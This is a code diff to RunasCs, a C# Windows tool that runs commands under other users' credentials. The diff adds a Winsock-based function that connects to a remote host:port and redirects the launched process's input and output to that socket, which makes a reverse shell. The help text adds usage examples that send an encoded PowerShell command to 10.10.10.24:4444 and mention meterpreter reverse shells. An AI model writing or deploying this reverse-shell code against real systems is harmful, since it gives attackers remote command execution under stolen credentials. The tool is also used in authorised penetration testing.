@@ -3,10 +3,11 @@ using System.Text;
 using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Net.Sockets;
 
 public static class RunasCs
 {
-    private const string error_string = "{{{RunasCsException}}}";
+    private const string error_string = "[-] RunasCsException";
     private const UInt16 SW_HIDE = 0;
     private const Int32 Startf_UseStdHandles = 0x00000100;
     private const int TokenType = 1; //primary token
@@ -87,6 +88,29 @@ public static class RunasCs
         SecurityDelegation
     }
 
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SOCKADDR_IN
+    {
+        public short sin_family;
+        public short sin_port;
+        public uint sin_addr;
+        public long sin_zero;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct WSAData
+    {
+        internal short wVersion;
+        internal short wHighVersion;
+        internal short iMaxSockets;
+        internal short iMaxUdpDg;
+        internal IntPtr lpVendorInfo;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
+        internal string szDescription;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
+        internal string szSystemStatus;
+    }
+
     [DllImport("Kernel32.dll", SetLastError=true)]
     private static extern bool CloseHandle(IntPtr handle);
     
@@ -139,6 +163,31 @@ public static class RunasCs
 
     [DllImport("userenv.dll", SetLastError=true, CharSet=CharSet.Auto)]
     static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize);
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
+                                            [In] SocketType socketType,
+                                            [In] ProtocolType protocolType,
+                                            [In] IntPtr protocolInfo,
+                                            [In] uint group,
+                                            [In] int flags
+                                            );
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    public static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    public static extern ushort htons(ushort hostshort);
+
+    [Obsolete]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    public static extern uint inet_addr(string cp);
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
+    static extern Int32 WSAGetLastError();
+
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
+    static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
     
     private static string GetProcessFunction(int createProcessFunction){
         if(createProcessFunction == 0)
@@ -228,6 +277,43 @@ public static class RunasCs
         return output;
     }
 
+    private static IntPtr connectRemote(string[] remote) {
+
+        int port = 0;
+        int error = 0;
+        string host = remote[0];
+
+        try {
+            port = Convert.ToInt32(remote[1]);
+        } catch {
+            Console.Out.WriteLine("[-] RunasCs: Specified port is invalid: " + remote[1]);
+            System.Environment.Exit(-1);
+        }
+
+        WSAData data;
+        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
+            error = WSAGetLastError();
+            Console.Out.WriteLine(String.Format("[-] RunasCs: WSAStartup failed with error code: {0}", error));
+            System.Environment.Exit(-1);
+        }
+
+        IntPtr socket = IntPtr.Zero;
+        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
+
+        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
+        sockinfo.sin_family = (short)2;
+        sockinfo.sin_addr = inet_addr(host);
+        sockinfo.sin_port = (short)htons((ushort)port);
+
+        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
+            error = WSAGetLastError();
+            Console.Out.WriteLine(String.Format("[-] RunasCs: WSAConnect failed with error code: {0}", error));
+            System.Environment.Exit(-1);
+        }
+
+        return socket;
+    }
+
     private static bool getUserEnvironmentBlock(IntPtr hToken, out IntPtr lpEnvironment, out string warning) {
 
         bool success;
@@ -305,7 +391,7 @@ public static class RunasCs
         return true;
     }
     
-    public static string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction)
+    public static string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote)
     /*
         int createProcessFunction:
             0: CreateProcessAsUser();
@@ -330,7 +416,7 @@ public static class RunasCs
         int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
         WindowStationDACL stationDaclObj = new WindowStationDACL();
         
-        if(processTimeout>0){
+        if(processTimeout > 0){
             if (!CreateAnonymousPipeEveryoneAccess(ref hOutputReadTmp, ref hOutputWrite)){
                 output += error_string + "\r\nCreatePipe failed with error code: " + Marshal.GetLastWin32Error();
                 return output;
@@ -350,8 +436,15 @@ public static class RunasCs
             startupInfo.hStdError = (IntPtr)hErrorWrite;
             processPath = Environment.GetEnvironmentVariable("ComSpec");
             commandLine = "/c " + cmd;
+
+        } else if( remote != null ) {
+            IntPtr socket = connectRemote(remote);
+            startupInfo.dwFlags = Startf_UseStdHandles;
+            startupInfo.hStdInput = socket;
+            startupInfo.hStdOutput = socket;
+            startupInfo.hStdError = socket;
         }
-   
+
         desktopName = stationDaclObj.AddAclToActiveWindowStation(domainName, username);
         startupInfo.lpDesktop = desktopName;
         if(createProcessFunction == 2){
@@ -419,7 +512,7 @@ public static class RunasCs
             CloseHandle(hToken);
             CloseHandle(hTokenDuplicate);
         }
-        if(processTimeout>0){
+        if(processTimeout > 0){
             CloseHandle(hOutputWrite);
             CloseHandle(hErrorWrite);
             WaitForSingleObject(processInfo.process, processTimeout);
@@ -1175,8 +1268,7 @@ Optional arguments:
                             Default: ""3""
     -r, --remote host:port
                             redirect stdin, stdout and stderr to a remote host.
-                            If not specified explicitly, the process timeout is
-                            set to 0.
+                            Using this options sets the process timeout to 0.
     -t, --timeout process_timeout
                             the waiting time (in ms) to use in
                             the WaitForSingleObject() function.
@@ -1192,15 +1284,14 @@ Examples:
     Run a command as a specific local user
         RunasCs.exe user1 password1 whoami
     Run a command as a specific domain user
-        RunasCs.exe user1 password1 whoami domain
+        RunasCs.exe user1 password1 whoami -d domain
     Run a command as a specific local user with interactive logon type (2)
-        RunasCs.exe user1 password1 whoami """" 120000 2
+        RunasCs.exe user1 password1 whoami -l 2
     Run a background/async process as a specific local user,
     i.e. meterpreter ps1 reverse shell
-        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc..."" """" ""0""
-    Run a background/async interactive process as a specific local user,
-    i.e. meterpreter ps1 reverse shell
-        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc.."" """" ""0"" ""2""
+        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc..."" -t 0
+    Redirect stdin, stdout and stderr of the specified command to a remote host
+        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc.."" -r 10.10.10.24:4444
 
 ";
     
@@ -1231,7 +1322,7 @@ Examples:
     
     private static uint ValidateProcessTimeout(string timeout)
     {
-        uint processTimeout = 12000;
+        uint processTimeout = 120000;
         try {
             processTimeout = Convert.ToUInt32(timeout);
         }
@@ -1338,9 +1429,8 @@ Examples:
         string username, password, cmd, domain;
         username = password = cmd = domain = string.Empty;
         string[] remote = null;
-        uint processTimeout = 12000;
+        uint processTimeout = 120000;
         int logonType = 3, createProcessFunction = DefaultCreateProcessFunction();
-        bool explicitTimeout = false;
 
         try {
             for(int ctr = 0; ctr < args.Length; ctr++) {
@@ -1355,7 +1445,6 @@ Examples:
                     case "-t":
                     case "--timeout":
                         processTimeout = ValidateProcessTimeout(args[++ctr]);
-                        explicitTimeout = true;
                         break;
 
                     case "-l":
@@ -1378,7 +1467,7 @@ Examples:
                         break;
                 }
             }
-        } catch(System.IndexOutOfRangeException e) {
+        } catch(System.IndexOutOfRangeException) {
             Console.Out.WriteLine("[-] RunasCs: Invalid arguments. Use --help for additional help.");
             System.Environment.Exit(1);
         }
@@ -1392,11 +1481,11 @@ Examples:
         password = positionals[1];
         cmd = positionals[2];
 
-        if( remote != null && explicitTimeout == false ) {
-            processTimeput = 0;
+        if( remote != null ) {
+            processTimeout = 0;
         }
 
-        output=RunasCs.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction);
+        output=RunasCs.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote);
         return output;
     }
 }
